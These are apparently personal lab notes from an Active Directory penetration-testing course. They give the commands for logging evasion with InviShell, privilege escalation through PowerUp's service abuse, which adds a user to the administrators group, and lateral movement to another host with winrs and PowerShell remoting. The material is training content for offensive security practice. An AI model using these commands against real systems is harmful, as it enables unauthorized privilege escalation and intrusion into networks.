**Local Admin**
==Check priv escalation path==
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
```
We can then use Service Abuse to add the user to the administrator group
```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```
Log off and login back to see if you can run stuff as administrator

---
==Check if the added user has admin access to any other machines in the domain==
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```
You will see what machines you can admins access to !

Then we can connect to ==***dcorp-adminsrv***== using winrs as the student user
```
winrs -r:dcorp-adminsrv cmd
set username
set computername
```
We can also use PowerShell Remoting:
```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
$env:username
```
---

